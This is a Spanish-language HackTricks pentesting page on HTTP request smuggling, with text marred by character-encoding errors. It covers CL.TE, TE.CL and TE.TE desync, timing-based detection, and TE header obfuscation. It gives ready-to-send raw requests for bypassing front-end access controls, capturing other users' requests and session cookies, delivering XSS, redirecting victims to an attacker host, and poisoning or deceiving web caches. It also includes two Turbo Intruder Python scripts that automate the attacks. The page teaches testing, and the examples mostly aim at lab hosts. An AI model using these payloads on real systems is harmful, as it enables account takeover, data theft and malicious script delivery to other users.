# Ataque de Desincronizaci√≥n de Solicitudes HTTP / Ataque de Desincronizaci√≥n HTTP

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n [**art√≠culos oficiales de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en GitHub.

</details>

## ¬øQu√© es?

Esta vulnerabilidad ocurre cuando una **desincronizaci√≥n** entre los **proxies de front-end** y el **servidor de back-end** permite a un **atacante** **enviar** una **solicitud HTTP** que ser√° **interpretada** como una **sola solicitud** por los **proxies de front-end** (balanceador de carga/proxy inverso) y **como 2 solicitudes** por el **servidor de back-end**.\
Esto permite a un usuario **modificar la siguiente solicitud que llega al servidor de back-end despu√©s de la suya**.

### Teor√≠a

[Especificaci√≥n RFC (2161)](https://tools.ietf.org/html/rfc2616)

> Si se recibe un mensaje con un campo de encabezado Transfer-Encoding y un campo de encabezado Content-Length, este √∫ltimo DEBE ser ignorado.

**Content-Length**

> El encabezado de entidad Content-Length indica el tama√±o del cuerpo de la entidad, en bytes, enviado al destinatario.

**Transfer-Encoding: chunked**

> El encabezado Transfer-Encoding especifica la forma de codificaci√≥n utilizada para transferir de manera segura el cuerpo de carga √∫til al usuario.\
> Chunked significa que se env√≠an datos grandes en una serie de fragmentos.

### Realidad

El **Front-End** (un balanceador de carga / Proxy Inverso) **procesa** el encabezado _**content-length**_ o el encabezado _**transfer-encoding**_ y el **servidor de Back-end** **procesa el otro** provocando una **desincronizaci√≥n** entre los 2 sistemas.\
Esto podr√≠a ser muy cr√≠tico ya que **un atacante podr√° enviar una solicitud** al proxy inverso que ser√° **interpretada** por el **servidor de back-end como 2 solicitudes diferentes**. El **peligro** de esta t√©cnica radica en el hecho de que el **servidor de back-end interpretar√° la 2da solicitud inyectada** como si **hubiera venido del siguiente cliente** y la **solicitud real** de ese cliente ser√° **parte** de la **solicitud inyectada**.

### Particularidades

Recuerda que en HTTP **un car√°cter de nueva l√≠nea est√° compuesto por 2 bytes:**

* **Content-Length**: Este encabezado utiliza un **n√∫mero decimal** para indicar el **n√∫mero** de **bytes** del **cuerpo** de la solicitud. Se espera que el cuerpo termine en el √∫ltimo car√°cter, **no se necesita una nueva l√≠nea al final de la solicitud**.
* **Transfer-Encoding:** Este encabezado utiliza en el **cuerpo** un **n√∫mero hexadecimal** para indicar el **n√∫mero** de **bytes** del **pr√≥ximo fragmento**. El **fragmento** debe **terminar** con una **nueva l√≠nea** pero esta nueva l√≠nea **no se cuenta** en el indicador de longitud. Este m√©todo de transferencia debe terminar con un **fragmento de tama√±o 0 seguido de 2 nuevas l√≠neas**: `0`
* **Connection**: Basado en mi experiencia, se recomienda usar **`Connection: keep-alive`** en la primera solicitud del Request Smuggling.

## Ejemplos B√°sicos

Entonces, los ataques de solicitud de contrabando implican colocar tanto el encabezado `Content-Length` como el encabezado `Transfer-Encoding` en una sola solicitud HTTP y manipularlos para que los servidores de front-end y back-end procesen la solicitud de manera diferente. La forma exacta en que se hace esto depende del comportamiento de los dos servidores:

* **CL.TE**: el servidor de front-end utiliza el encabezado `Content-Length` y el servidor de back-end utiliza el encabezado `Transfer-Encoding`.
* **TE.CL**: el servidor de front-end utiliza el encabezado `Transfer-Encoding` y el servidor de back-end utiliza el encabezado `Content-Length`.
* **TE.TE**: los servidores de front-end y back-end admiten ambos el encabezado `Transfer-Encoding`, pero se puede inducir a uno de los servidores a no procesarlo al ofuscar de alguna manera el encabezado.

### Vulnerabilidades CL.TE

Aqu√≠, el **servidor de front-end** utiliza el encabezado **`Content-Length`** y el **servidor de back-end** utiliza el encabezado **`Transfer-Encoding`**. Podemos realizar un simple ataque de solicitud de contrabando HTTP de la siguiente manera:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 30`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /404 HTTP/1.1`\
`Foo: x`

Observa c√≥mo `Content-Length` indica que la **longitud del cuerpo de la solicitud es de 30 bytes** (_recuerda que HTTP usa como nueva l√≠nea, por lo que son 2 bytes por cada nueva l√≠nea_), por lo que el proxy inverso **enviar√° la solicitud completa** al back-end, y el back-end procesar√° el encabezado `Transfer-Encoding` dejando el `GET /404 HTTP/1.1` como el **inicio de la siguiente solicitud** (por cierto, la siguiente solicitud se agregar√° a `Foo:x<Siguiente solicitud comienza aqu√≠>`).

### Vulnerabilidades TE.CL

Aqu√≠, el servidor de front-end utiliza el encabezado `Transfer-Encoding` y el servidor de back-end utiliza el encabezado `Content-Length`. Podemos realizar un simple ataque de solicitud de contrabando HTTP de la siguiente manera:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 4`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `7b`\ `GET /404 HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 30`\``\
`x=`\
`0`\
`\`

En este caso, el **proxy inverso** enviar√° **toda la solicitud** al **back-end** ya que el **`Transfer-encoding`** lo indica as√≠. Pero, el **back-end** solo procesar√° los **`7b`** (4 bytes) como se indica en el `Content-Length`. Por lo tanto, la siguiente solicitud ser√° la que comience con `GET /404 HTTP/1.1`

_Nota que aunque el ataque debe terminar con un `0`, la siguiente solicitud se agregar√° como valores adicionales del par√°metro **x**._\
_Tambi√©n ten en cuenta que el Content-Length de la solicitud incrustada indicar√° la longitud de la siguiente solicitud que se va a agregar al par√°metro **x**. Si es demasiado peque√±o, solo se agregar√°n unos pocos bytes, y si es demasiado grande (m√°s grande que la longitud de la siguiente solicitud), se producir√° un error para la siguiente solicitud._

### Vulnerabilidades TE.TE

Aqu√≠, los servidores de front-end y back-end admiten ambos el encabezado `Transfer-Encoding`, pero uno de los servidores puede ser inducido a no procesarlo al ofuscar el encabezado de alguna manera.\
Potencialmente hay formas interminables de ofuscar el encabezado `Transfer-Encoding`. Por ejemplo:

`Transfer-Encoding: xchunked`\
``\ `Transfer-Encoding : chunked`\``\
`Transfer-Encoding: chunked`\
`Transfer-Encoding: x`\
``\ `Transfer-Encoding: chunked`\ `Transfer-encoding: x`\``\
`Transfer-Encoding:[tab]chunked`\
``\ `[space]Transfer-Encoding: chunked`\``\
`X: X[\n]Transfer-Encoding: chunked`\
\`\`\
`Transfer-Encoding`\
`: chunked`

Dependiendo del servidor (proxy inverso o de respaldo) que **deje de procesar** el encabezado **TE**, encontrar√°s una **vulnerabilidad CL.TE** o una **vulnerabilidad TE.CL**.

## Encontrar Solicitudes HTTP de Contrabando

### Encontrar vulnerabilidades CL.TE utilizando t√©cnicas de temporizaci√≥n

Si una aplicaci√≥n es vulnerable a la variante CL.TE de solicitud de contrabando, entonces enviar una solicitud como la siguiente a menudo causar√° un retraso en el tiempo:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
Dado que el servidor front-end utiliza el encabezado `Content-Length`, solo reenviar√° parte de esta solicitud, omitiendo el `0`. El servidor back-end utiliza el encabezado `Transfer-Encoding`, procesa el primer fragmento y luego espera a que llegue el siguiente fragmento. Esto causar√° un retraso observable en el tiempo.

A veces, en lugar de recibir un tiempo de espera, se recibe una solicitud incorrecta 400 del host final como en el siguiente escenario, donde se env√≠a un payload CL.TE:

![](<../../.gitbook/assets/image (444).png>)

Y la respuesta es una redirecci√≥n que contiene un error dentro del cuerpo, incluso con la versi√≥n de haproxy utilizada:

![](<../../.gitbook/assets/image (443).png>)

### Encontrar vulnerabilidades TE.CL utilizando t√©cnicas de temporizaci√≥n

Si una aplicaci√≥n es vulnerable a la variante TE.CL de request smuggling, entonces enviar una solicitud como la siguiente a menudo causar√° un retraso en el tiempo:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
### Sondeando vulnerabilidades de HTTP Request Smuggling

Una vez que hayas descubierto que las **t√©cnicas de temporizaci√≥n funcionan**, necesitas **sondear** si puedes **alterar las solicitudes de otros clientes**.\
La forma m√°s sencilla de hacer esto es intentar envenenar tus propias solicitudes, **hacer una solicitud para `/` y que devuelva un 404, por ejemplo**.\
En los [Ejemplos B√°sicos](./#basic-examples) ya vimos ejemplos de `CL.TE` y `TE.CL` de c√≥mo envenenar una solicitud de un cliente para pedir `/404`, provocando una respuesta 404 cuando el cliente estaba solicitando cualquier otro recurso.

**Notas**

Al intentar confirmar vulnerabilidades de request smuggling mediante la interferencia con otras solicitudes, se deben tener en cuenta algunas consideraciones importantes:

* La solicitud de "ataque" y la solicitud "normal" deben enviarse al servidor utilizando conexiones de red diferentes. Enviar ambas solicitudes a trav√©s de la misma conexi√≥n no demostrar√° que la vulnerabilidad existe.
* La solicitud de "ataque" y la solicitud "normal" deben usar la misma URL y nombres de par√°metros, en la medida de lo posible. Esto se debe a que muchas aplicaciones modernas dirigen las solicitudes de front-end a diferentes servidores de back-end seg√∫n la URL y los par√°metros. Usar la misma URL y par√°metros aumenta la posibilidad de que las solicitudes sean procesadas por el mismo servidor de back-end, lo cual es esencial para que el ataque funcione.
* Al probar la solicitud "normal" para detectar cualquier interferencia de la solicitud "ataque", est√°s compitiendo con cualquier otra solicitud que la aplicaci√≥n est√© recibiendo al mismo tiempo, incluidas las de otros usuarios. Debes enviar la solicitud "normal" inmediatamente despu√©s de la solicitud "ataque". Si la aplicaci√≥n est√° ocupada, es posible que necesites realizar varios intentos para confirmar la vulnerabilidad.
* En algunas aplicaciones, el servidor de front-end funciona como un balanceador de carga y reenv√≠a las solicitudes a diferentes sistemas de back-end seg√∫n alg√∫n algoritmo de equilibrio de carga. Si tus solicitudes "ataque" y "normal" se reenv√≠an a diferentes sistemas de back-end, entonces el ataque fallar√°. Esta es una raz√≥n adicional por la que es posible que necesites intentarlo varias veces antes de que se pueda confirmar una vulnerabilidad.
* Si tu ataque tiene √©xito al interferir con una solicitud posterior, pero esta no fue la solicitud "normal" que enviaste para detectar la interferencia, esto significa que otro usuario de la aplicaci√≥n se vio afectado por tu ataque. Si contin√∫as realizando la prueba, esto podr√≠a tener un efecto disruptivo en otros usuarios, por lo que debes tener precauci√≥n.

### Forzando a trav√©s de encabezados hop-by-hop

Abusando de los encabezados hop-by-hop, podr√≠as indicar al proxy que **elimine el encabezado Content-Length o Transfer-Encoding para que sea posible abusar de un HTTP request smuggling**.
```
Connection: Content-Length
```
Para **m√°s informaci√≥n sobre los encabezados hop-by-hop**, visita:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## Abuso de HTTP Request Smuggling

### Para evadir controles de seguridad del front-end

A veces los **proxies del front-end realizan algunas verificaciones de seguridad**. Puedes evitarlos abusando de HTTP Request Smuggling ya que podr√°s **burlar las protecciones**. Por ejemplo, en este caso **no puedes acceder a `/admin` desde el exterior** y el proxy del front-end lo est√° verificando, pero este **proxy no est√° verificando la solicitud incrustada**:

**CL.TE**

`POST / HTTP/1.1`\
`Host: acb21fdd1f98c4f180c02944000100b5.web-security-academy.net`\
`Cookie: session=xht3rUYoc83NfuZkuAp8sDxzf0AZIwQr`\
`Connection: keep-alive`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 67`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`Content-Length: 10`\
\`\`\
`x=`

**TE.CL**

`POST / HTTP/1.1`\
`Host: ace71f491f52696180f41ed100d000d4.web-security-academy.net`\
`Cookie: session=Dpll5XYw4hNEu09dGccoTjHlFNx5QY1c`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 4`\
`Transfer-Encoding: chunked`\
`2b`\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`a=x`\
`0`\
`\`

### Revelando la reescritura de solicitudes del front-end <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

En muchas aplicaciones, el **servidor del front-end realiza alguna reescritura de solicitudes** antes de enviarlas al servidor del back-end, t√≠picamente agregando algunos encabezados de solicitud adicionales.\
Una acci√≥n com√∫n es **agregar al encabezado de la solicitud** `X-Forwarded-For: <IP del cliente>` u otro encabezado similar para que el back-end conozca la IP del cliente.\
A veces, si puedes **encontrar qu√© nuevos valores se agregan** a la solicitud, podr√≠as ser capaz de **burlar protecciones** y **acceder a informaci√≥n oculta**/**puntos finales**.

Para descubrir c√≥mo el proxy reescribe la solicitud, necesitas **encontrar un par√°metro POST que el back-end reflejar√° en su valor** en la respuesta. Luego, utiliza este par√°metro como el √∫ltimo y usa un exploit como este:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 130`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
`0`\
``\ `POST /search HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 100`\``\
`search=`

En este caso, la pr√≥xima solicitud se agregar√° despu√©s de `search=`, que es tambi√©n **el par√°metro cuyo valor se reflejar√°** en la respuesta, por lo tanto, se **reflejar√°n los encabezados de la pr√≥xima solicitud**.

Ten en cuenta que **solo se reflejar√° la longitud indicada en el encabezado `Content-Length` de la solicitud incrustada**. Si usas un n√∫mero bajo, solo se reflejar√°n unos pocos bytes, si usas un n√∫mero mayor que la longitud de todos los encabezados, entonces la solicitud incrustada arrojar√° un error. Por lo tanto, debes **comenzar** con un **n√∫mero peque√±o** y **aumentarlo** hasta que veas todo lo que deseas ver.\
Tambi√©n ten en cuenta que esta **t√©cnica tambi√©n es explotable con una vulnerabilidad TE.CL** pero la solicitud debe terminar con `search=\r\n0`. Sin embargo, independientemente de los caracteres de nueva l√≠nea, los valores se agregar√°n al par√°metro de b√∫squeda.

Finalmente, ten en cuenta que en este ataque todav√≠a estamos atac√°ndonos a nosotros mismos para aprender c√≥mo el proxy del front-end est√° reescribiendo la solicitud.

### Capturando solicitudes de otros usuarios <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Si puedes encontrar una solicitud POST que va a guardar el contenido de uno de los par√°metros, puedes agregar la siguiente solicitud como el valor de ese par√°metro para almacenar la solicitud del siguiente cliente:

`POST / HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 319`\
`Connection: keep-alive`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`POST /post/comment HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Length: 659`\
`Content-Type: application/x-www-form-urlencoded`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
\`\`\
`csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=HACKTRICKS&email=email%40email.com&comment=`

En este caso, el valor del **par√°metro comentario** se guardar√° dentro de un comentario de una publicaci√≥n en la p√°gina que es **p√∫blicamente accesible**, por lo que aparecer√° un **comentario con el contenido de la siguiente solicitud**.

_Una limitaci√≥n de esta t√©cnica es que generalmente solo capturar√° datos hasta el delimitador de par√°metros que es aplicable para la solicitud contrabandeada. Para env√≠os de formularios codificados en URL, esto ser√° el car√°cter `&`, lo que significa que el contenido almacenado de la solicitud del usuario v√≠ctima terminar√° en el primer `&`, que incluso podr√≠a aparecer en la cadena de consulta._

Ten en cuenta tambi√©n que esta **t√©cnica tambi√©n es explotable con una vulnerabilidad TE.CL** pero la solicitud debe terminar con `search=\r\n0`. Sin embargo, independientemente de los caracteres de nueva l√≠nea, los valores se agregar√°n al par√°metro de b√∫squeda.

### Usar HTTP request smuggling para explotar XSS reflejado

Si la p√°gina web tambi√©n es **vulnerable a XSS reflejado**, puedes abusar de HTTP Request Smuggling para atacar a los clientes de la web. La explotaci√≥n de XSS reflejado desde HTTP Request Smuggling tiene algunas ventajas:

* **No requiere interacci√≥n con los usuarios v√≠ctima**
* Se puede usar para **explotar** el comportamiento de XSS en partes de la solicitud que **no pueden ser controladas trivialmente en un ataque de XSS reflejado normal**, como los encabezados de solicitud HTTP.

Si una web es vulnerable a XSS reflejado en el encabezado User-Agent, puedes usar este payload para explotarlo:

`POST / HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0`\
`Cookie: session=Ro7YknOtbl3bxURHAAxZz84qj3PSMnSY`\
`Transfer-Encoding: chunked`\
`Connection: keep-alive`\
`Content-Length: 213`\
`Content-Type: application/x-www-form-urlencoded`\
``\ `0`\``\
`GET /post?postId=2 HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: "><script>alert(1)</script>`\
`Content-Length: 10`\
`Content-Type: application/x-www-form-urlencoded`\
\`\`\
`A=`

### Usar HTTP request smuggling para convertir una redirecci√≥n en el sitio en una redirecci√≥n abierta <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

Muchas aplicaciones realizan redirecciones en el sitio de una URL a otra y colocan el nombre de host del encabezado `Host` de la solicitud en la URL de redirecci√≥n. Un ejemplo de esto es el comportamiento predeterminado de los servidores web Apache e IIS, donde una solicitud para una carpeta sin una barra diagonal recibe una redirecci√≥n a la misma carpeta incluyendo la barra diagonal:

`GET /home HTTP/1.1`\
`Host: normal-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://normal-website.com/home/`

Este comportamiento normalmente se considera inofensivo, pero puede ser explotado en un ataque de contrabando de solicitudes para redirigir a otros usuarios a un dominio externo. Por ejemplo:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 54`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: X`

La solicitud contrabandeada desencadenar√° una redirecci√≥n al sitio web del atacante, lo que afectar√° la solicitud del siguiente usuario que sea procesada por el servidor del back-end. Por ejemplo:

`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: XGET /scripts/include.js HTTP/1.1`\
`Host: vulnerable-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://attacker-website.com/home/`

Aqu√≠, la solicitud del usuario era para un archivo JavaScript que fue importado por una p√°gina en el sitio web. El atacante puede comprometer completamente al usuario v√≠ctima devolviendo su propio JavaScript en la respuesta.

### Usar HTTP request smuggling para realizar envenenamiento de cach√© web <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

Si alguna parte de la **infraestructura del front-end realiza almacenamiento en cach√© de contenido** (generalmente por razones de rendimiento), **podr√≠a ser posible envenenar esa cach√© modificando la respuesta del servidor**.

Ya hemos visto c√≥mo modificar el valor devuelto esperado del servidor a un 404 (en los [Ejemplos B√°sicos](./#basic-examples)), de manera similar podr√≠as hacer que el servidor devuelva el contenido de `/index.html` cuando la solicitud envenenada est√© pidiendo `/static/include.js`. De esta manera, el contenido de `/static/include.js` se almacenar√° con el contenido de `/index.html`, haciendo que `/static/include.js` sea inaccesible para los clientes (¬øDoS?).

Esto es a√∫n m√°s interesante si encuentras alguna **Redirecci√≥n Abierta** o alguna **redirecci√≥n en el sitio a redirecci√≥n abierta** (√∫ltima secci√≥n). Porque podr√≠as ser capaz de **cambiar los valores en cach√©** de `/static/include.js` con los **de un script controlado por ti** (realizando un **XSS general a todos los clientes** que intenten descargar la nueva versi√≥n de `/static/include.js`).

En este ejemplo se mostrar√° c√≥mo puedes explotar un **envenenamiento de cach√© + redirecci√≥n en el sitio a redirecci√≥n abierta** para modificar los contenidos en cach√© de `/static/include.js` para **servir c√≥digo JS controlado** por el atacante:

`POST / HTTP/1.1`\
`Host: vulnerable.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 124`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /post/next?postId=3 HTTP/1.1`\
`Host: attacker.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 10`\
\`\`\
`x=1`

Observa c√≥mo la solicitud incrustada est√° pidiendo `/post/next?postId=3`. Esta solicitud ser√° redirigida a `/post?postId=4` y **utilizar√° el valor del encabezado Host** para indicar el dominio. Por lo tanto, puedes **modificar el encabezado Host** para apuntar al servidor del atacante y la redirecci√≥n usar√° ese dominio (**redirecci√≥n en el sitio a redirecci√≥n abierta**).

Luego, **despu√©s de envenenar el socket**, debes enviar una **solicitud GET** a \*\*`/static/include.js`\*\* esta solicitud ser√° **envenenada** por la solicitud **de redirecci√≥n en el sitio a redirecci√≥n abierta** y **obtendr√° los contenidos del script controlado por el atacante**.

La pr√≥xima vez que alguien solicite `/static/include.js`, se servir√°n los contenidos en cach√© del script del atacante (XSS general).

### Usar HTTP request smuggling para realizar enga√±o de cach√© web <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **¬øCu√°l es la diferencia entre envenenamiento de cach√© web y enga√±o de cach√© web?**
>
> * En **envenenamiento de cach√© web**, el atacante hace que la aplicaci√≥n almacene alg√∫n contenido malicioso en la cach√©, y este contenido se sirve desde la cach√© a otros usuarios de la aplicaci√≥n.
> * En **enga√±o de cach√© web**, el atacante hace que la aplicaci√≥n almacene alg√∫n contenido sensible perteneciente a otro usuario en la cach√©, y luego el atacante recupera este contenido de la cach√©.

En esta variante, el atacante contrabandea una solicitud que devuelve alg√∫n contenido sensible espec√≠fico del usuario. Por ejemplo:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`

Si el **veneno llega a un cliente que estaba accediendo a alg√∫n contenido est√°tico** como `/someimage.png` que iba a ser **cach√©**, los contenidos de `/private/messages` del usuario v√≠ctima se almacenar√°n en `/someimage.png` y el atacante podr√° robarlos.\
Ten en cuenta que el **atacante no sabe qu√© contenido est√°tico estaba intentando acceder el usuario v√≠ctima** por lo que probablemente la mejor manera de probar esto es realizar el ataque, esperar unos segundos y **cargar todos** los contenidos est√°ticos y **buscar los datos privados**.

### Armando HTTP Request Smuggling con Desincronizaci√≥n de Respuesta HTTP

¬øHas encontrado alguna vulnerabilidad de HTTP Request Smuggling y no sabes c√≥mo explotarla? Prueba este otro m√©todo de explotaci√≥n:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Scripts de Turbo Intruder

### CL.TE

Desde [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Desde: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## M√°s informaci√≥n

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

[Imagen desde aqu√≠.](https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104)

## Herramientas

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Esta herramienta es un Fuzzer HTTP basado en gram√°tica √∫til para encontrar discrepancias extra√±as en el tr√°fico de solicitudes.

## Referencias

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
